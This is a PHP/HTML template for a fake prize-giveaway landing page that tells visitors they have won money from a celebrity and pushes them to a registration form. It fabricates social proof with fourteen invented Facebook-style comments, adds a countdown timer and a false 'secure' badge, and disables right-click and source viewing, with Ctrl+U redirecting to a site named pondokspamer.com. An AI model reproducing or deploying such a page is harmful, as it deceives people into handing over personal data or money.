<?php  
include_once($_SERVER['DOCUMENT_ROOT'] ."/app/config.php");
include_once($_SERVER['DOCUMENT_ROOT'] ."/language/za.php");
?>
<!DOCTYPE HTML>

<html>
<head>
  <style type="text/css">
   .left    { text-align: left;}
   .right   { text-align: right;}
   .center  { text-align: center;}
   .justify { text-align: justify;}
</style>


  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title><?php echo $config_artis;?> - <?php echo $janjiartis_za;?></title>
  <meta name="description" content="">
  <meta name="keywords" content="">

  <link rel="icon" type="image/png" href="/include/images/giveaway.png">

  <link href="https://fonts.googleapis.com/css?family=Asap:400,700,400italic,700italic" rel="stylesheet" type="text/css">
  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
  <link href="/include/css/bootstrap.min.css" rel="stylesheet" type="text/css">
  <link href="/include/css/dashicons.css" rel="stylesheet" type="text/css">
  <link href="/include/css/mov.css" rel="stylesheet" type="text/css">
  <link href="/include/style.css" rel="stylesheet" type="text/css">
<link href="/include/stylee.css" rel="stylesheet">
<link href="/include/fbfeed.css" rel="stylesheet" type="text/css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.7.1/modernizr.min.js" type="text/javascript"></script>
  <script src="/include/js/css3-mediaqueries.js" type="text/javascript"></script>  
  <link href="/include/css/video-js.css" rel="stylesheet">
<script src="/include/css/videojs-ie8.min.js"></script>
<script src="/include/css/video.js"></script>
<script src="/include/css/resolution-switcher.js"></script>
<link href="/include/css/resolution-switcher.css" rel="stylesheet">
<link href="/include/css/videojs-overlay.css" rel="stylesheet">
<script src="/include/css/videojs-overlay.min.js"></script>  
<script src="/include/css/videojs.disableProgress.js"></script>
<script src="/include/css/waktu.css"></script>
<script src="/include/js/waktu.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.7.1/modernizr.min.js" type="text/javascript"></script>
<script src="https://rawcdn.githack.com/erBabysia96/mov/3f67ac8b/css3-mediaqueries.js" type="text/javascript"></script>
<script language=javascript>
<!--
var message="Arep Ngapa Kowe Cuk!!!";
///////////////////////////////////
function clickIE4(){
   if (event.button==2){
      alert(message);
      return false;
   }
}
function clickNS4(e){
   if (document.layers||document.getElementById&&!document.all){
      if (e.which==2||e.which==3){
      alert(message);
      return false;
      }
   }
}
if (document.layers){
   document.captureEvents(Event.MOUSEDOWN);
   document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
   document.onmousedown=clickIE4;
}
document.oncontextmenu=new Function("alert(message);return false")
// -->
</script>
<script type='text/javascript'>
//<![CDATA[
shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="https://www.pondokspamer.com"});
//]]>
</script>
<style>
.blink {
  animation: blink-animation 1s steps(5, start) infinite;
  -webkit-animation: blink-animation 1s steps(5, start) infinite;
}
@keyframes blink-animation {
  to {
    visibility: hidden;
  }
}
@-webkit-keyframes blink-animation {
  to {
    visibility: hidden;
  }
}
</style>
<style>
      * {box-sizing: border-box;}
      body {font-family: Verdana, sans-serif;}
      .mySlides {display: none;}
      img {vertical-align: middle;}

      /* Slideshow container */
      .slideshow-container {
        max-width: 1000px;
        position: relative;
        margin: auto;
      }

      /* Caption text */
      .text {
        color: #f2f2f2;
        font-size: 15px;
        padding: 8px 12px;
        position: absolute;
        bottom: 8px;
        width: 100%;
        text-align: center;
      }

      /* Number text (1/3 etc) */
      .numbertext {
        color: #f2f2f2;
        font-size: 12px;
        padding: 8px 12px;
        position: absolute;
        top: 0;
      }

      /* The dots/bullets/indicators */
      .dot {
        height: 15px;
        width: 15px;
        margin: 0 2px;
        background-color: #bbb;
        border-radius: 50%;
        display: inline-block;
        transition: background-color 1.6s ease;
      }

      .active {
        background-color: #0B243B;
      }

      /* Fading animation */
      .fade {
        -webkit-animation-name: fade;
        -webkit-animation-duration: 1.5s;
        animation-name: fade;
        animation-duration: 3.5s;
      }

      @-webkit-keyframes fade {
        from {opacity: .4}
        to {opacity: 1}
      }

      @keyframes fade {
        from {opacity: .4}
        to {opacity: 1}
      }

      /* On smaller screens, decrease text size */
      @media only screen and (max-width: 300px) {
        .text {font-size: 11px}
      }
    </style>
 <style type="text/css">
      @font-face {
        font-family: tulisan_keren;
        src: url(https://github.com/anwar-bae/Ga/blob/master/Eighties%20FREE.otf);
      }
      body{
        background: #0B0B61;

        font-family: 'Bahnschrift', cursive;
      }
      a {
              color:#167ac6;
              text-decoration: none;
      }
      a:hover,
      a:focus {
              text-decoration: underline;
      }
      ol, ul {
            padding-left: 20px;
      }
      .h1, h1 {
              font-size: 26px;
      }
      .navbar-custom {
              background-color: #222;
              border-color: #080808;
              color: #fff;
      }
      .navbar-toggle {
              color: #428BCA;
      }
      .navbar-custom a{
              color: #fff;
      }
      .navbar-custom a:hover{
              color: wheat;
      }
      .navbar-custom .nav>li>a:hover,
      .navbar-custom .nav>li>a:focus,.nav .open>a, .nav .open>a:focus, .nav .open>a:hover {
              background-color: #337ab7;
      }
      .box-container {
        margin-bottom: 25px;
        padding: 15px;
      }
      table {
              background-color: #FFFFFF;
      }
      .table-striped>tbody>tr:nth-of-type(odd) {
              background-color: #FFFFFF;
      }
      .table>tbody>tr>td, .table>tbody>tr>th, .table>tfoot>tr>td, .table>tfoot>tr>th, .table>thead>tr>td, .table>thead>tr>th {
              border-top: 1px solid #dddddd;
      }
      .nowrap {
              display: block;
              white-space: nowrap;
              text-overflow: ellipsis;
              overflow: hidden;
      }
      .page-header {
              margin: 0  0 15px;
              margin: 0 5px 10px 10px;
              padding: 10px;
              -webkit-border-radius: 5px;
              -moz-border-radius: 5px;
              border-radius: 5px;
              -webkit-box-shadow: inset 3px -4px 21px -6px rgba(87,86,87,0.44);
              -moz-box-shadow: inset 3px -4px 21px -6px rgba(87,86,87,0.44);
              box-shadow: inset 3px -4px 21px -6px rgba(87,86,87,0.44);
      }
      .movie-list {
              margin-bottom: 10px;
              padding-bottom: 10px;
              background: #FFF;
              overflow: hidden;
              padding: 10px;
              -webkit-border-radius: 4px;
              -moz-border-radius: 4px;
              border-radius: 4px;
              border: 1px solid #dddddd;
      }
      .movie-list .thumbnail {
              margin-bottom: 3px;
      }
      .movie-list-title {
              font-size: 13px;
              padding: 2px 0px;
              font-weight: 700;
      }
      .media-left a.playicon {
              width: 128px;
              height: 128px;
              display: block;
              margin-top: -64px;
              margin-left: -115px;
              left: 50%;
              top: 60%;
              position: absolute;
      }
      .media-left a.playicon i {
              color: #fff;
              font-size: 50px;
              margin-top: 28px;
              opacity: .5;
      }
      .col-xs-15,
      .col-sm-15,
      .col-md-15,
      .col-lg-15 {
          position: relative;
          min-height: 1px;
          padding-right: 10px;
          padding-left: 10px;
      }
      .col-xs-15 {
          width: 20%;
          float: left;
      }
      @media (min-width: 768px) {
      .col-sm-15 {
              width: 20%;
              float: left;
          }
      }
      @media (min-width: 992px) {
          .col-md-15 {
              width: 20%;
              float: left;
          }
      }
      @media (min-width: 1200px) {
          .col-lg-15 {
              width: 20%;
              float: left;
          }
      }
      @media (max-width: 767px){
              .dropdown-menu>li>a {
                      color: #fff;
              }
      }



      .fb_pic{
          width:48px;
          height:48px;
          border-radius: 50%;
          border-color: #034efc;
          border-width: 2px;
          border-style: solid;
      }
      .fb_meta{
          color: #90949c;
          font-size: 12px;
          line-height: 1.358;
      }
      .fb_meta a{
          color: #4267b2;
      }
      .fb_comment{
          color: #1d2129;
          margin: 4px 0 4px 0;
          font-size:14px;
          line-height: 19.012px;
      }
      .fb_comment_wrapper{
          font-family: helvetica, arial, sans-serif;
          margin-bottom:15px;
      }
      .fb_name{
          color: #365899;
          cursor: pointer;
          text-decoration: none;
          font-weight:bold;
          font-size:14px;
      }
      .fb_image_block{
          float:left;
          margin-right: 10px;
      }
      .fb_image{
          height:48px;
      }
      .fb_comment_block{
          margin-left: 55px;
      }
      .fb_line{
          margin-bottom: 0px;
      }
      .fb_plugin_link{
          color: #365899;
          cursor: pointer;
          text-decoration: none;
          font-size:11px;
          font-family: helvetica, arial, sans-serif;
      }
      .fb_comments_count_cover{
          font-size:14px;
          font-family: helvetica, arial, sans-serif;
          font-weight: bold;
          color: #1d2129;
          background-color:white;
          z-index:2;
          padding:5px;
          display: inline-block;
          position: absolute;
      }
      .fb_comments_container{
          height: 120px !important;
          overflow:hidden !important;
      }
      .fb_comment_section{
          padding-left: 8px;
          margin-top:15px;
      }
      .fb_like_button{
          padding-right: 4px;
          margin-top: -5px;
      }
      .fb_pic{
          width:48px;
          height:48px;
          border-radius: 50%;
          border-color: #034efc;
          border-width: 2px;
          border-style: solid;
      }
      .fb_meta{
          color: #90949c;
          font-size: 12px;
          line-height: 1.358;
      }
      .fb_meta a{
          color: #4267b2;
      }
      .fb_comment{
          color: #1d2129;
          margin: 4px 0 4px 0;
          font-size:14px;
          line-height: 19.012px;
      }
      .fb_comment_wrapper{
          font-family: helvetica, arial, sans-serif;
          margin-bottom:15px;
      }
      .fb_name{
          color: #365899;
          cursor: pointer;
          text-decoration: none;
          font-weight:bold;
          font-size:14px;
      }
      .fb_image_block{
          float:left;
          margin-right: 10px;
      }
      .fb_image{
          height:48px;
      }
      .fb_comment_block{
          margin-left: 55px;
      }
      .fb_line{
          margin-bottom: 0px;
      }
      .fb_plugin_link{
          color: #365899;
          cursor: pointer;
          text-decoration: none;
          font-size:11px;
          font-family: helvetica, arial, sans-serif;
      }
      .fb_comments_count_cover{
          font-size:14px;
          font-family: helvetica, arial, sans-serif;
          font-weight: bold;
          color: #1d2129;
          background-color:white;
          z-index:2;
          padding:5px;
          display: inline-block;
          position: absolute;
      }
      .fb_comments_container{
          height: 120px !important;
          overflow:hidden !important;
      }
      .fb_comment_section{
          padding-left: 8px;
          margin-top:15px;
      }
      .fb_like_button{
          padding-right: 4px;
          margin-top: -5px;
      }
    </style>
  <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script> 
    <script src="https://oss.maxcdn.com/respond/1.3/respond.min.js"></script>
  <![endif]-->
</head>
<body oncontextmenu="return false" onkeydown="return false;" onmousedown="return false;">
<div class="navbar navbar-inverse navbar-static-top">
        <div class="container">
                <div class="navbar-header">
                        
                       <a class="navbar-brand" href="#"><?php echo $header_za;?></a>
                </div><!-- navbar-header -->
                
        </div><!-- container -->
</div>
    
<div class="container box-container">
  <div class="row">
     <div class="col-md-9 col-xs-12">


  <center>
    <div class="text-center media-heading" style="margin-top: 10px;">
      <h1><font color="green"><strong><span class="blink"><?php echo $selamet_za;?></span></strong></font></h1>
      <br><br>
      <h2><font color="red"><strong><?php echo $menangkeun_za;?></font><span class="blink"><font color="green"> <b><?php echo $config_artis;?></b></font></span></strong></h2>
      <br>
  </center>
  <center>
    <div class="available-formats-img-mobile"><img src="/include/images/gambar1.png" class="img-responsive"> </div>
  
      <h3><font color="black"><strong><font color="orange"><?php echo $ucapan_za;?> <span class="blink"><b><font color="red"><?php echo $jenisduit_za;?><?php echo $config_duite;?> - <?php echo $jenisduit_za;?><?php echo $config_duite1;?></font></b></span> <?php echo $ucapan1_za;?></font> </strong></h3>
      <br>
    <div class="available-formats-img-mobile"><img src="/include/images/pisa.png" class="img-responsive"></div>
      <h3><font color="Black bean"><strong> <?php echo $ucapan2_za;?></strong></font> </h3><br>
  </center>
  
      

              </tbody>
      </table>    
      
<div class="page-header text-center tittle h4">
              <div class="slideshow-container">

              <div class="mySlides fade">
                <div class="numbertext">1 / 4</div>
                <img src="https://bit.ly/3rG8QV0" style="width:100%; border-radius: 10px;">
                <div class="text"></div>
              </div>

              <div class="mySlides fade">
                <div class="numbertext">2 / 4</div>
                <img src="https://bit.ly/373zOOj" style="width:100%; border-radius: 10px;">
                <div class="text"></div>
              </div>

              <div class="mySlides fade">
                <div class="numbertext">3 / 4</div>
                <img src="https://bit.ly/3a4mbAl" style="width:100%; border-radius: 10px;">
                <div class="text"></div>
              </div>

              <div class="mySlides fade">
                <div class="numbertext">4 / 4</div>
                <img src="https://bit.ly/2NfTxn3" style="width:100%; border-radius: 10px;">
                <div class="text"></div>
              </div>

              </div>
              <br>

              <div style="text-align:center">
                <span class="dot"></span>
                <span class="dot"></span>
                <span class="dot"></span>
                <span class="dot"></span>
              </div>
            </div>
                <center>
                  <div>
                    <span style="font-size: 15px; text-align: center; color: #08088A; font-style: italic;"><?php echo $mungguhmu_za;?></span>
                    <br>
                    <span style="font-size: 15px; text-align: center; color: #B40431;">~ Michele Johnson ~</span>
                  </div>
                </center>
          <center>  
  <h3><font color="green"><strong><span class="blink"> <?php echo $ucapan3_za;?></span></strong></font> </h3><br>
  <h2><b><font color="E01A1A"><?php echo $ngenteni_za;?></font></b></h2>
  <td align="center"><img src="/include/images/timer1.gif" width='250' height='280' class="img-responsive"></td>
  <div class="available-formats-img-mobile"><img src="/include/images/panah.gif" class="img-responsive"> </div>                          
  <div class="btn btn-lg">
  <a href="/register.php"> <button class="btn btn-success btn-lg"><span class="blink"><h2><font color="Chinese yellow"><strong><?php echo $daftarin_za;?></font></strong></span></button> </a>
  </div><p><i class="fa fa-lock"></i> <?php echo $amanin_za;?></p>
  </center>

<tbody>
  <tr>
    <div class="col-md-12">
      <div id="fbFeedbackContent">
        <p align="left">
          <font color="#4169E1"><strong><?php echo $komenjum_za;?> </strong></font> 
        </p> 
        <td>
          <div class="activityContent">
            <div class='fb_comment_wrapper'>
              <div class='fb_image_block'>
                <img src='https://bit.ly/3aQPJk7' class='fb_pic'/>
              </div>
              <div class='fb_comment_block'>
                <div class='fb_name'>
                  Carol Baynes
                </div>
                <div class='fb_comment'>
                  <?php echo $komen1_za;?>
                  <img src="https://bit.ly/3cYCj8A" class="img-responsive">
                </div>
              </div>
              <div class='fb_meta'>
                <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $suka_za;?></a> •
                <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $balasan_za;?></a> •
                <img class='fb_like_button fb_meta_item' src='/include/images/like.png'><span class='like_count fb_meta_item'>90</span> •
                <span class='fb_timestamp'>
                  <div class='fb_image_block'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>5 <?php echo $waktumenit_za;?>
                </span>
              </div>
            </div>

            <div class='fb_comment_wrapper'>
              <div class='fb_image_block'>
                <img src='https://bit.ly/2LEyRVi' class='fb_pic'/>
              </div>
              <div class='fb_comment_block'>
                <div class='fb_name'>
                  Kendall Adams
                </div>
                <div class='fb_comment'>
                  <?php echo $komen2_za;?>
                  <img src="https://bit.ly/3q2RP6S" class="img-responsive">
                </div>
              </div>                
                <div class='fb_meta'>
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $suka_za;?></a> •
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $balasan_za;?></a> •
                  <img class='fb_like_button fb_meta_item' src='/include/images/like.png'><span class='like_count fb_meta_item'>30</span> •
                  <span class='fb_timestamp'>7 <?php echo $waktumenit_za;?></span>
                </div>
            </div>

            <div class='fb_comment_wrapper'>
              <div class='fb_image_block'>
                <img src='https://bit.ly/3a49JjX' class='fb_pic'/>
              </div>
              <div class='fb_comment_block'>
                <div class='fb_name'>
                  Carmenza Duran Pena
                </div>
                <div class='fb_comment'>
                  <?php echo $komen3_za;?>
                  <img src="https://bit.ly/2LzxVRU" class="img-responsive">
                  <div class='fb_meta'>
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $suka_za;?></a> •
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $balasan_za;?></a> •
                  <img class='fb_like_button fb_meta_item' src='/include/images/like.png'>
                  <span class='like_count fb_meta_item'>590</span> •
                  <span class='fb_timestamp'>
                  <div class='fb_image_block'></div>
                      1 <?php echo $waktujam_za;?>
                  </span>
                </div>
              </div>
            </div>

            <div class='fb_comment_wrapper'>
              <div class='fb_image_block'>
                <img src='https://bit.ly/3p8epcS' class='fb_pic'/>
              </div>
              <div class='fb_comment_block'>
                <div class='fb_name'>
                    Joshua Benoit
                </div>
                <div class='fb_comment'>
                  <?php echo $komen4_za;?>
                  <img src="https://bit.ly/3jBh3XE" class="img-responsive">
                </div>
              </div>
              <div class='fb_meta'>
                <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $suka_za;?></a> •
                <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $balasan_za;?></a> •
                <img class='fb_like_button fb_meta_item' src='/include/images/like.png'>
                <span class='like_count fb_meta_item'>240</span> •
                <span class='fb_timestamp'>
                  <div class='fb_image_block'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>1 <?php echo $waktujam_za;?>
                </span>
              </div>
            </div>

            <div class='fb_comment_wrapper'>
              <div class='fb_image_block'>
                <img src='https://bit.ly/3tGGCep' class='fb_pic'/>
              </div>
              <div class='fb_comment_block'>
                <div class='fb_name'>
                  Kendra Hughes
                </div>
                <div class='fb_comment'>
                  <?php echo $komen5_za;?>
                  <img src="https://bit.ly/3p79vNB" class="img-responsive">
                </div>
                  <div class='fb_meta'>
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $suka_za;?></a> •
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $balasan_za;?></a> •
                  <img class='fb_like_button fb_meta_item' src='/include/images/like.png'><span class='like_count fb_meta_item'>398</span> •
                  <span class='fb_timestamp'>1 <?php echo $waktujam_za;?></span>
                  </div>
              </div>

              </div>

            <div class='fb_comment_wrapper'>
              <div class='fb_image_block'>
                <img src='https://bit.ly/3p5t2Ol' class='fb_pic'/>
              </div>
              <div class='fb_comment_block'>
                <div class='fb_name'>
                  Dina Krupkin
                </div>
                <div class='fb_comment'>
                  <?php echo $komen6_za;?>
                  <img src="https://bit.ly/3a5BDfB" class="img-responsive">
                </div>
              </div>
              <div class='fb_meta'>
                <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $suka_za;?></a> •
                <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $balasan_za;?></a> •
                <img class='fb_like_button fb_meta_item' src='/include/images/like.png'><span class='like_count fb_meta_item'>490</span> •
                <span class='fb_timestamp'>
                    <div class='fb_image_block'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>
                    2 <?php echo $waktujam_za;?>
                </span>
              </div>
            </div>

            </div>

            <div class='fb_comment_wrapper'>
              <div class='fb_image_block'><img src='https://bit.ly/3p69ucw' class='fb_pic'/></div>
                <div class='fb_comment_block'>
                  <div class='fb_name'>
                    Lydia Cherry Hardin
                  </div>
                  <div class='fb_comment'>
                    <?php echo $komen7_za;?>
                    <img src="https://bit.ly/2Oj3u3n" class="img-responsive">
                  </div>
                  <div class='fb_meta'>
                    <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $suka_za;?></a> •
                    <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $balasan_za;?></a> •
                    <img class='fb_like_button fb_meta_item' src='/include/images/like.png'><span class='like_count fb_meta_item'>658</span> •
                    <span class='fb_timestamp'>2 <?php echo $waktujam_za;?></span>
                  </div>
                </div>
              </div>

              <div class='fb_comment_wrapper'>
                <div class='fb_image_block'>
                  <img src='https://bit.ly/371VMRI' class='fb_pic'/>
                </div>
                <div class='fb_comment_block'>
                  <div class='fb_name'>
                    Shiran Huber
                  </div>
                  <div class='fb_comment'><?php echo $komen8_za;?>
                    <img src="https://bit.ly/3tLOoUe" class="img-responsive">
                  </div>
                </div>
                <div class='fb_meta'>
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $suka_za;?></a> •
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $balasan_za;?></a> •
                  <img class='fb_like_button fb_meta_item' src='/include/images/like.png'><span class='like_count fb_meta_item'>790</span> •
                  <span class='fb_timestamp'>
                    <div class='fb_image_block'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>3 <?php echo $waktujam_za;?>
                  </span>
                </div>
              </div>

              <div class='fb_comment_wrapper'>
                <div class='fb_image_block'>
                  <img src='https://bit.ly/2Z6EXk8' class='fb_pic'/>
                </div>
                <div class='fb_comment_block'>
                  <div class='fb_name'>
                    Brandy Firkins
                  </div>
                  <div class='fb_comment'>
                    <?php echo $komen9_za;?>
                    <img src="https://bit.ly/3tKvw8k" class="img-responsive">
                  </div>
                </div>
                <div class='fb_meta'>
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $suka_za;?></a> •
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $balasan_za;?></a> •
                  <img class='fb_like_button fb_meta_item' src='/include/images/like.png'><span class='like_count fb_meta_item'>396</span> •
                  <span class='fb_timestamp'>
                    <div class='fb_image_block'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>3 <?php echo $waktujam_za;?>
                  </span>
                </div>
              </div>

              <div class='fb_comment_wrapper'>
                <div class='fb_image_block'>
                  <img src='https://bit.ly/2MSvg6z' class='fb_pic'/>
                </div>
                <div class='fb_comment_block'>
                  <div class='fb_name'>
                    Tamara Marie Hensley
                  </div>
                  <div class='fb_comment'>
                    <?php echo $komen10_za;?>
                    <img src="https://bit.ly/3a8PIcm" class="img-responsive">
                  </div>
                </div>
                <div class='fb_meta'>
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $suka_za;?></a> •
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $balasan_za;?></a> •
                  <img class='fb_like_button fb_meta_item' src='/include/images/like.png'><span class='like_count fb_meta_item'>430</span> •
                  <span class='fb_timestamp'>
                    <div class='fb_image_block'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>3 <?php echo $waktujam_za;?>
                  </span>
                </div>
              </div>

              <div class='fb_comment_wrapper'>
                <div class='fb_image_block'>
                  <img src='https://bit.ly/3d791V0' class='fb_pic'/>
                </div>
                <div class='fb_comment_block'>
                  <div class='fb_name'>
                    Arnold Berry
                  </div>
                  <div class='fb_comment'>
                    <?php echo $komen11_za;?>
                    <img src="https://bit.ly/3a4dCFN" class="img-responsive">
                  </div>
                </div>
                <div class='fb_meta'>
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $suka_za;?></a> •
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $balasan_za;?></a> •
                  <img class='fb_like_button fb_meta_item' src='/include/images/like.png'><span class='like_count fb_meta_item'>660</span> •
                  <span class='fb_timestamp'>
                    <div class='fb_image_block'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>3 <?php echo $waktujam_za;?>
                  </span>
                </div>
              </div>

              <div class='fb_comment_wrapper'>
                <div class='fb_image_block'>
                  <img src='https://bit.ly/2N8ydjb' class='fb_pic'/>
                </div>
                <div class='fb_comment_block'>
                  <div class='fb_name'>
                    Jessica Mickel Seekins
                  </div>
                  <div class='fb_comment'>
                    <?php echo $komen12_za;?>
                    <img src="https://bit.ly/2NdvxAO" class="img-responsive">
                  </div>
                </div>
                <div class='fb_meta'>
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $suka_za;?></a> •
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $balasan_za;?></a> •
                  <img class='fb_like_button fb_meta_item' src='/include/images/like.png'><span class='like_count fb_meta_item'>102</span> •
                  <span class='fb_timestamp'>
                    <div class='fb_image_block'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>4 <?php echo $waktujam_za;?>
                  </span>
                </div>
              </div>

              <div class='fb_comment_wrapper'>
                <div class='fb_image_block'>
                  <img src='https://bit.ly/2Z1I7FQ' class='fb_pic'/>
                </div>
                <div class='fb_comment_block'>
                  <div class='fb_name'>
                    John Stewart
                  </div>
                  <div class='fb_comment'>
                    <?php echo $komen13_za;?>
                    <img src="https://bit.ly/3rJj7iX" class="img-responsive">
                  </div>
                  <div class='fb_meta'>
                    <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $suka_za;?></a> •
                    <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $balasan_za;?></a> •
                    <img class='fb_like_button fb_meta_item' src='/include/images/like.png'><span class='like_count fb_meta_item'>130</span> •
                    <span class='fb_timestamp'>4 <?php echo $waktujam_za;?></span>
                  </div>
                </div>
              </div>

              <div class='fb_comment_wrapper'>
                <div class='fb_image_block'>
                  <img src='https://bit.ly/3qbZWOs' class='fb_pic'/>
                </div>
                <div class='fb_comment_block'>
                  <div class='fb_name'>
                    Waverly Mangalindan
                  </div>
                  <div class='fb_comment'>
                    <?php echo $komen4_za;?>
                    <img src="https://bit.ly/3aQQoCe" class="img-responsive">
                  </div>
                </div>
                <div class='fb_meta'>
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $suka_za;?></a> •
                  <a onclick="JavaScript:alert('You must create an account before commenting.')" class='fb_like fb_meta_item'><?php echo $balasan_za;?></a> •
                  <img class='fb_like_button fb_meta_item' src='/include/images/like.png'><span class='like_count fb_meta_item'>136</span> •
                  <span class='fb_timestamp'>
                    <div class='fb_image_block'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>5 <?php echo $waktujam_za;?>
                  </span>
                </div>
              </div>
              </div>

              <br/> 
              <br/> 
              <br/> 
